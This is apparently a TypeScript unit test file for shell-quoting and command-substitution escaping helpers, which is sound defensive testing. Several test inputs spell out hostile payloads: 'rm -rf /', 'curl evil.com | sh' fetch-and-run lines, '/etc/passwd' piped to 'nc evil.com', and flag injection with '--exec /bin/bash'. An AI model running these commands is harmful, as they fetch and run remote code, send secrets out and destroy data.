import * as assert from 'assert';
import { shellQuote, neutralizeCommandSubstitution, shellSplit } from "../shellEscaping";
export function runShellQuoteTests() {
    it('wraps empty string', () => {
        assert.equal(shellQuote(''), "''");
    });

    it('wraps null', () => {
        assert.equal(shellQuote(null), "''");
    });

    it('wraps undefined', () => {
        assert.equal(shellQuote(undefined), "''");
    });

    it('wraps simple path', () => {
        assert.equal(shellQuote('/path/to/file'), "'/path/to/file'");
    });

    it('wraps path with spaces', () => {
        assert.equal(shellQuote('/path/with spaces/file'), "'/path/with spaces/file'");
    });

    it('wraps and escapes single quotes', () => {
        assert.equal(shellQuote("it's here"), "'it'\\''s here'");
    });

    it('blocks command injection via single-quote breakout', () => {
        const malicious = "'; rm -rf / #";
        const result = shellQuote(malicious);
        assert.equal(result, "''\\''; rm -rf / #'");
    });

    it('blocks command substitution (safe inside single quotes)', () => {
        const malicious = "$(curl evil.com | sh)";
        const result = shellQuote(malicious);
        assert.equal(result, "'$(curl evil.com | sh)'");
    });

    it('blocks backtick substitution (safe inside single quotes)', () => {
        const malicious = "`curl evil.com | sh`";
        const result = shellQuote(malicious);
        assert.equal(result, "'`curl evil.com | sh`'");
    });

    it('handles semicolons and pipes (safe inside single quotes)', () => {
        const malicious = "file; cat /etc/passwd | nc evil.com 1234";
        const result = shellQuote(malicious);
        assert.equal(result, "'file; cat /etc/passwd | nc evil.com 1234'");
    });

    it('wraps value that is only single quotes', () => {
        assert.equal(shellQuote("'"), "''\\'''");
    });

    it('produces a shell-safe token for path with spaces and quotes', () => {
        assert.equal(shellQuote("/path/to/my files/it's here"), "'/path/to/my files/it'\\''s here'");
    });
}

export function runNeutralizeCommandSubstitutionTests() {
    it('returns null/undefined/empty unchanged', () => {
        assert.equal(neutralizeCommandSubstitution(null), null);
        assert.equal(neutralizeCommandSubstitution(undefined), undefined);
        assert.equal(neutralizeCommandSubstitution(''), '');
    });

    it('returns simple string unchanged', () => {
        assert.equal(neutralizeCommandSubstitution('--flag=value'), '--flag=value');
    });

    it('preserves $VAR', () => {
        assert.equal(neutralizeCommandSubstitution('$HOME'), '$HOME');
    });

    it('preserves ${VAR}', () => {
        assert.equal(neutralizeCommandSubstitution('${HOME}'), '${HOME}');
    });

    it('escapes backtick substitution', () => {
        assert.equal(neutralizeCommandSubstitution('`whoami`'), '\\`whoami\\`');
    });

    it('escapes $() substitution', () => {
        assert.equal(neutralizeCommandSubstitution('$(id)'), '\\$\\(id\\)');
    });

    it('handles mixed content preserving env vars', () => {
        assert.equal(
            neutralizeCommandSubstitution('-DFOO=$(curl evil.com) -DBAR=${ENV_VAR}'),
            '-DFOO=\\$\\(curl\\ evil.com\\)\\ -DBAR=${ENV_VAR}'
        );
    });

    it('escapes nested substitution', () => {
        assert.equal(
            neutralizeCommandSubstitution('$(echo `whoami`)'),
            '\\$\\(echo\\ \\`whoami\\`\\)'
        );
    });

    it('handles real cmake args with env vars', () => {
        assert.equal(
            neutralizeCommandSubstitution('.. -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR -DBUILD_TYPE=${BUILD_TYPE}'),
            '..\\ -DCMAKE_INSTALL_PREFIX=$INSTALL_DIR\\ -DBUILD_TYPE=${BUILD_TYPE}'
        );
    });

    it('blocks real attack payload', () => {
        const payload = '.. -DFOO=$(curl http://evil.com/payload.sh | sh)';
        const result = neutralizeCommandSubstitution(payload);
        assert.equal(result, '..\\ -DFOO=\\$\\(curl\\ http://evil.com/payload.sh\\ \\|\\ sh\\)');
    });

    it('does not escape ${VAR} brace-expansion (regression guard)', () => {
        assert.equal(neutralizeCommandSubstitution('${HOME}/${USER}'), '${HOME}/${USER}');
    });

    it('does not escape bare dollar followed by letter (regression guard)', () => {
        assert.equal(neutralizeCommandSubstitution('$HOME $PATH $1'), '$HOME\\ $PATH\\ $1');
    });

    it('escapes existing backslashes before backticks to prevent backslash consumption', () => {
        assert.equal(neutralizeCommandSubstitution('\\`cmd`'), '\\\\\\`cmd\\`');
    });

    it('escapes standalone backslashes', () => {
        assert.equal(neutralizeCommandSubstitution('a\\b'), 'a\\\\b');
    });

    it('strips carriage return', () => {
        assert.equal(neutralizeCommandSubstitution('a\rb'), 'ab');
    });

    it('strips carriage return + newline', () => {
        assert.equal(neutralizeCommandSubstitution('a\r\nb'), 'ab');
    });

    it('strips newline', () => {
        assert.equal(neutralizeCommandSubstitution('a\nb'), 'ab');
    });

    it('escapes semicolons', () => {
        assert.equal(neutralizeCommandSubstitution('echo hello;whoami'), 'echo\\ hello\\;whoami');
    });

    it('escapes redirect operators', () => {
        assert.equal(neutralizeCommandSubstitution('cat file > /tmp/out'), 'cat\\ file\\ \\>\\ /tmp/out');
        assert.equal(neutralizeCommandSubstitution('cmd < input'), 'cmd\\ \\<\\ input');
    });

    it('escapes ampersand', () => {
        assert.equal(neutralizeCommandSubstitution('cmd1 & cmd2'), 'cmd1\\ \\&\\ cmd2');
        assert.equal(neutralizeCommandSubstitution('cmd1 && cmd2'), 'cmd1\\ \\&\\&\\ cmd2');
    });

    it('escapes hash comment character', () => {
        assert.equal(neutralizeCommandSubstitution('value # comment'), 'value\\ \\#\\ comment');
    });

    it('escapes standalone parentheses', () => {
        assert.equal(neutralizeCommandSubstitution('(cmd)'), '\\(cmd\\)');
    });

    it('escapes single quotes instead of preserving them (CWE-78 fix)', () => {
        assert.equal(neutralizeCommandSubstitution("'$(safe)'"), "\\'\\$\\(safe\\)\\'");
    });

    it('escapes backticks inside former single-quoted content', () => {
        assert.equal(neutralizeCommandSubstitution("'`safe`'"), "\\'\\`safe\\`\\'");
    });

    it('escapes meta chars inside former single-quoted content', () => {
        assert.equal(neutralizeCommandSubstitution("';|<>&#'"), "\\'\\;\\|\\<\\>\\&\\#\\'");
    });

    it('escapes single quote breakout attack (CWE-78 critical fix)', () => {
        assert.equal(
            neutralizeCommandSubstitution("'; whoami; echo '"),
            "\\'\\;\\ whoami\\;\\ echo\\ \\'"
        );
    });

    it('escapes outside and inside single quotes uniformly', () => {
        assert.equal(
            neutralizeCommandSubstitution("'$(safe)';bad"),
            "\\'\\$\\(safe\\)\\'\\;bad"
        );
    });

    it('escapes double quotes', () => {
        assert.equal(neutralizeCommandSubstitution('"hello"'), '\\"hello\\"');
    });

    it('escapes double quote breakout attack', () => {
        assert.equal(
            neutralizeCommandSubstitution('"; cat /etc/passwd; echo "'),
            '\\"\\;\\ cat\\ /etc/passwd\\;\\ echo\\ \\"'
        );
    });

    it('escapes spaces', () => {
        assert.equal(neutralizeCommandSubstitution('hello world'), 'hello\\ world');
    });

    it('escapes tabs', () => {
        assert.equal(neutralizeCommandSubstitution('hello\tworld'), 'hello\\\tworld');
    });

    it('escapes space in path', () => {
        assert.equal(neutralizeCommandSubstitution('/path/with spaces/file'), '/path/with\\ spaces/file');
    });

    it('escapes flag injection via spaces', () => {
        assert.equal(
            neutralizeCommandSubstitution('--config /dev/null --exec /bin/bash'),
            '--config\\ /dev/null\\ --exec\\ /bin/bash'
        );
    });

    it('handles multiple meta-characters combined', () => {
        assert.equal(
            neutralizeCommandSubstitution('a|b;c&d<e>f#g'),
            'a\\|b\\;c\\&d\\<e\\>f\\#g'
        );
    });

    it('escapes $() even when an apostrophe is present', () => {
        assert.equal(
            neutralizeCommandSubstitution("it's $(cmd)"),
            "it\\'s\\ \\$\\(cmd\\)"
        );
    });

    it('blocks arithmetic expansion $((...))', () => {
        assert.equal(neutralizeCommandSubstitution('$((1+2))'), '\\$\\(\\(1+2\\)\\)');
    });

    it('escapes all $() occurrences when multiple are present', () => {
        assert.equal(
            neutralizeCommandSubstitution('$(a) $(b)'),
            '\\$\\(a\\)\\ \\$\\(b\\)'
        );
    });

    it('escapes single quotes and adjacent $()', () => {
        assert.equal(neutralizeCommandSubstitution("''$(cmd)"), "\\'\\'\\$\\(cmd\\)");
    });

    it('double-escapes already-escaped input (not idempotent by design)', () => {
        assert.equal(neutralizeCommandSubstitution('\\$\\(cmd\\)'), '\\\\$\\\\\\(cmd\\\\\\)');
    });

    it('escapes $() inside double quotes', () => {
        assert.equal(neutralizeCommandSubstitution('"$(cmd)"'), '\\"\\$\\(cmd\\)\\"');
    });

    it('escapes apostrophe and quotes uniformly in mixed content', () => {
        assert.equal(
            neutralizeCommandSubstitution("it's a '$(cmd)' test"),
            "it\\'s\\ a\\ \\'\\$\\(cmd\\)\\'\\ test"
        );
    });
}

export function runShellSplitTests() {
    it('returns empty array for null/undefined/empty', () => {
        assert.deepEqual(shellSplit(null), []);
        assert.deepEqual(shellSplit(undefined), []);
        assert.deepEqual(shellSplit(''), []);
    });

    it('splits simple space-separated args', () => {
        assert.deepEqual(shellSplit('-DFOO=bar -DBAZ=qux'), ['-DFOO=bar', '-DBAZ=qux']);
    });

    it('splits tab-separated args', () => {
        assert.deepEqual(shellSplit('-DFOO=bar\t-DBAZ=qux'), ['-DFOO=bar', '-DBAZ=qux']);
    });

    it('handles multiple spaces between tokens', () => {
        assert.deepEqual(shellSplit('a   b   c'), ['a', 'b', 'c']);
    });

    it('handles leading and trailing whitespace', () => {
        assert.deepEqual(shellSplit('  a b  '), ['a', 'b']);
    });

    it('preserves single-quoted content as one token', () => {
        assert.deepEqual(
            shellSplit("-DPATH='/usr/local/my app' -DVER=1.0"),
            ['-DPATH=/usr/local/my app', '-DVER=1.0']
        );
    });

    it('preserves double-quoted content as one token', () => {
        assert.deepEqual(
            shellSplit('-DPATH="/usr/local/my app" -DVER=1.0'),
            ['-DPATH=/usr/local/my app', '-DVER=1.0']
        );
    });

    it('handles escaped spaces outside quotes', () => {
        assert.deepEqual(
            shellSplit('-DPATH=/usr/local/my\\ app -DVER=1.0'),
            ['-DPATH=/usr/local/my app', '-DVER=1.0']
        );
    });

    it('handles empty quoted strings', () => {
        assert.deepEqual(shellSplit("'' \"\""), ['', '']);
    });

    it('handles mixed quoting styles', () => {
        assert.deepEqual(
            shellSplit(`-Da="hello" -Db='world' -Dc=plain`),
            ['-Da=hello', '-Db=world', '-Dc=plain']
        );
    });

    it('handles single token (no splitting needed)', () => {
        assert.deepEqual(shellSplit('-DFOO=bar'), ['-DFOO=bar']);
    });

    it('handles quoted value with special chars preserved', () => {
        assert.deepEqual(
            shellSplit("-DFOO='hello;world' -DBAR=ok"),
            ['-DFOO=hello;world', '-DBAR=ok']
        );
    });

    it('handles backslash escape inside double quotes', () => {
        assert.deepEqual(
            shellSplit('-DFOO="hello\\"world"'),
            ['-DFOO=hello"world']
        );
    });

    it('handles adjacent quoted and unquoted segments', () => {
        assert.deepEqual(
            shellSplit("pre'mid'post"),
            ['premidpost']
        );
    });

    it('works in full workflow: split → neutralize → join', () => {
        const input = '-DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=$HOME/install';
        const tokens = shellSplit(input);
        const escaped = tokens.map(t => neutralizeCommandSubstitution(t)!);
        const result = escaped.join(' ');
        assert.equal(result, '-DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=$HOME/install');
    });

    it('workflow preserves quoted spaces after split+neutralize+join', () => {
        const input = '-DPATH="/my files/dir" -DVER=1.0';
        const tokens = shellSplit(input);
        assert.deepEqual(tokens, ['-DPATH=/my files/dir', '-DVER=1.0']);
        const escaped = tokens.map(t => neutralizeCommandSubstitution(t)!);
        assert.equal(escaped.join(' '), '-DPATH=/my\\ files/dir -DVER=1.0');
    });

    it('workflow blocks injection in multi-param input', () => {
        const input = '-DFOO=bar -DBAZ=$(whoami)';
        const tokens = shellSplit(input);
        const escaped = tokens.map(t => neutralizeCommandSubstitution(t)!);
        assert.equal(escaped.join(' '), '-DFOO=bar -DBAZ=\\$\\(whoami\\)');
    });
}
